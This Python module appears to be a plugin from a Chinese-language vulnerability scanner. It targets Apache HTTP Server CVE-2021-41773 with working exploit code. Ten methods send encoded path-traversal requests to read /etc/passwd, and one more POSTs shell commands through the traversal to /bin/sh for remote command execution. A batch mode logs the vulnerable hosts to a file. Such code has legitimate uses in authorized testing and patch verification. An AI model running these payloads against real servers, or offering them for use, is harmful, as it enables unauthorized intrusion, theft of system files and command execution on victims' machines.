#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo, OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests, urllib3
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class Cve_2021_41773_2:
    def send_payload(self, url):
        url2 = url + '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
        try:
            req = requests.get(url2,verify=self.verify, proxies=self.proxy, headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
                if self.batch:
                    OutPutFile("apache_2021_41773.txt", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache HTTP Server路径穿越漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
    def send_payload4(self, url):
        url2 = url + '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
        try:
            req = requests.get(url2,verify=self.verify, proxies=self.proxy, headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
                if self.batch:
                    OutPutFile("apache_2021_41773.txt", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache HTTP Server路径穿越漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
    def send_payload7(self, url):
        url2 = url + '/assets/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
        try:
            req = requests.get(url2,verify=self.verify, proxies=self.proxy, headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
                if self.batch:
                    OutPutFile("apache_2021_41773.txt", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache HTTP Server路径穿越漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
    def send_payload8(self, url):
        url2 = url + '/img/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
        try:
            req = requests.get(url2,verify=self.verify, proxies=self.proxy, headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
                if self.batch:
                    OutPutFile("apache_2021_41773.txt", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache HTTP Server路径穿越漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
    def send_payload9(self, url):
        url2 = url + '/image/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
        try:
            req = requests.get(url2,verify=self.verify, proxies=self.proxy, headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
                if self.batch:
                    OutPutFile("apache_2021_41773.txt", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache HTTP Server路径穿越漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
    def send_payload2(self, url):
        url2 = url + '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
        try:
            req = requests.get(url2,verify=self.verify, proxies=self.proxy, headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
                if self.batch:
                    OutPutFile("apache_2021_41773.txt", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache HTTP Server路径穿越漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
    def send_payload5(self, url):
        url2 = url + '/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
        try:
            req = requests.get(url2,verify=self.verify, proxies=self.proxy, headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
                if self.batch:
                    OutPutFile("apache_2021_41773.txt", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache HTTP Server路径穿越漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
    def send_payload6(self, url):
        url2 = url + '/assets/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
        try:
            req = requests.get(url2,verify=self.verify, proxies=self.proxy, headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
                if self.batch:
                    OutPutFile("apache_2021_41773.txt", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache HTTP Server路径穿越漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
    def send_payload10(self, url):
        url2 = url + '/image/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
        try:
            req = requests.get(url2,verify=self.verify, proxies=self.proxy, headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
                if self.batch:
                    OutPutFile("apache_2021_41773.txt", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache HTTP Server路径穿越漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")

    def send_payload11(self, url):
        url2 = url + '/image/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
        try:
            req = requests.get(url2, verify=self.verify, proxies=self.proxy, headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache HTTP Server路径穿越漏洞 {url2}")
                if self.batch:
                    OutPutFile("apache_2021_41773.txt",f"存在Apache HTTP Server路径穿越漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache HTTP Server路径穿越漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
    def send_payload3(self, url):
        url2 = url + '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
        data = "echo Content-Type: text/plain; echo; id; uname"
        try:
            req = requests.post(url2, timeout=5,verify=self.verify, proxies=self.proxy, headers=self.header, data=data)
            if "uid=" in req.text:
                OutPrintInfoSuc("Apache", f"存在Apache HTTP Server任意命令执行漏洞 {url2}")
                if self.batch:
                    OutPutFile("apache_2021_41773.txt",f"存在Apache HTTP Server任意命令执行漏洞 {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f"不存在Apache HTTP Server任意命令执行漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.header, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测Apache HTTP Server路径穿越漏洞...")
            OutPrintInfo("Apache", "开始检测POC-1...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测POC-2...")
        self.send_payload4(url)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测POC-3...")
        self.send_payload7(url)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测POC-4...")
        self.send_payload8(url)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测POC-5...")
        self.send_payload9(url)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测POC-6...")
        self.send_payload2(url)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测POC-7...")
        self.send_payload5(url)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测POC-8...")
        self.send_payload6(url)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测POC-9...")
        self.send_payload10(url)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测POC-10...")
        self.send_payload11(url)
        if not self.batch:
            OutPrintInfo("Apache", "开始检测POC-11...")
        self.send_payload3(url)
        if not self.batch:
            OutPrintInfo("Apache", "Apache HTTP Server路径穿越漏洞检测结束")
